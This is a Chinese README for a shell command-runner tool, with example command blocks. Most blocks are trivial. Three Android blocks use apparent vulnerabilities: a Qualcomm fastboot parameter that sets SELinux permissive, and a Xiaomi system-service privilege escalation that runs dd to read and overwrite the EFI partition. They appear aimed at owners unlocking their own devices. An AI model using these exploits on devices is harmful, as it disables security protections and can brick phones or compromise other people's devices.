### 使用示例

#### 注意事项
1. [INIT] 块为全局标识，任意位置的脚本都会加载该部分内容
2. [] 可以创建标签，方便筛选
3. commands文件格式：每一个命令块，由`# `行开始，以`空`行结束 编写注意格式问题

#### 全局
`touch ~/.commands`
1. 创建全局.commands文件，写入示例内容
2. dddrun-global

#### 地方
`touch commands` 
1. 创建commands文件，写入示例内容
2. dddrun-cmd

#### 示例内容
```
# [INIT]
confirm_continue() {
    read -p "是否继续执行？[Y/N] " ans
    case $ans in
        [Yy]* ) ;;          # 输入 Y/y → 什么都不做，继续
        * ) exit 0 ;;       # 其他 → 直接退出脚本
    esac
}

# [T] TEST1
pwd && confirm_continue
ls -lh && confirm_continue
uptime

# [T] TEST2
ls -lh && confirm_continue
htop

# [Android] 高通漏洞 fastboot 解除selinux限制
adb reboot bootloader && confirm_continue
fast oem "set-gpu-preemption 0 androidboot.selinux=permissive" && confirm_continue
fastboot continue

# [Android] xiaomi漏洞 提权用以备份efi分区
adb shell "service call miui.mqsas.IMQSNative 21 i32 1 s16 'dd' i32 1 s16 'if=/dev/block/by-name/efisp of=/data/local/tmp/efisp_backup.efi' s16 '/data/mqsas/log.txt' i32 60" && confirm_continue
adb pull /data/local/tmp/efisp_backup.efi efisp_backup.efi && confirm_continue
adb shell rm /data/local/tmp/efisp_backup.efi

# [Android] xiaomi漏洞 提权用以修改efi分区并重启
adb push gbl_efi_unlock.efi /data/local/tmp/gbl_efi_unlock.efi && confirm_continue
adb shell "service call miui.mqsas.IMQSNative 21 i32 1 s16 'dd' i32 1 s16 'if=/data/local/tmp/gbl_efi_unlock.efi of=/dev/block/by-name/efisp' s16 '/data/mqsas/log.txt' i32 60" && confirm_continue
adb reboot
```
